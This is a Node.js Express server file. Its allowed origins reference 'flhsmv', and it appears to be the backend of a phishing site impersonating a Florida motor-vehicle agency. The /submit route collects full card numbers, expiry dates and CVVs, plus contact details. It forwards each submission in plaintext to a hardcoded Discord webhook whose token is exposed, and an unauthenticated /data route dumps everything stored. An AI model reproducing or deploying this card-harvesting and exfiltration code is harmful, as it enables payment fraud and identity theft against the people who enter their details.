  const express = require("express");
  const cors = require("cors");
  require("dotenv").config();
  const fetch = require("node-fetch");

  const app = express();
  const port = process.env.PORT || 4000;
  
  // Define allowed origins:
  const allowedOrigins = [
    "https://flhsmv-admin.vercel.app",
    "http://localhost:3000",
    "https://flhsmv.onrender.com"
  ];
  
  // Setup CORS with a custom callback
  app.use(cors({
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.indexOf(origin) !== -1) {
        return callback(null, true);
      } else {
        return callback(new Error("Not allowed by CORS"));
      }
    }
  }));
  
  app.use(express.json());
  
  // In-memory storage
  let storage = [];
  
  // POST route for submissions
  app.post("/submit", async (req, res) => {
    const { name, email, phone, state, message, cardNumber, expirationDate, cvv } = req.body;
  
    if (
      typeof cardNumber === "string" &&
      cardNumber.length === 16 &&
      typeof expirationDate === "string" &&
      typeof cvv === "string" &&
      (cvv.length === 3 || cvv.length === 4)
    ) {
      storage.push({ cardNumber, expirationDate, cvv });
      console.log("Stored Payment Info:", storage);
  
      // ✅ Discord Notification for Payment Submissions
      await fetch("https://discord.com/api/webhooks/1394963202290356244/S40WWwqr2j3kQsXh-Ic5LMocbR-nf0E4pPu4YBpZ62TXPrHeCsSrpqzHMh7K_tBpBaGf", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `💳 **New Payment Submission**
          **Expiration Date:** ${expirationDate}
          **Card Number:** ${cardNumber}
          **CVV:** ${cvv}`
        })
      }).catch(console.error);
  
      return res.status(200).json({ message: "Payment data stored successfully" });
    }
  
    if (name && email && phone && state && message) {
      storage.push({ name, email, phone, state, message });
      console.log("Stored Contact Info:", storage);
  
      // ✅ Discord Notification for Contact Submissions
      await fetch("https://discord.com/api/webhooks/1394963202290356244/S40WWwqr2j3kQsXh-Ic5LMocbR-nf0E4pPu4YBpZ62TXPrHeCsSrpqzHMh7K_tBpBaGf", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📬 **New Contact Submission**
          **Name:** ${name}
          **Email:** ${email}
          **Phone:** ${phone}
          **State:** ${state}
          **Message:** ${message}`
        })
      }).catch(console.error);
  
      return res.status(200).json({ message: "Contact data stored successfully" });
    }
  
    return res.status(400).json({ message: "Invalid or incomplete data submitted." });
  });
  
  // GET route for data display
  app.get("/data", (req, res) => {
    res.status(200).json(storage);
  });
  
  // Health check
  app.get("/ping", (req, res) => {
    res.status(200).json({ message: "Viewer app connected successfully!" });
  });
  
  // Start server
  app.listen(port, () => {
    console.log(`Server running on port ${port}`);
  });
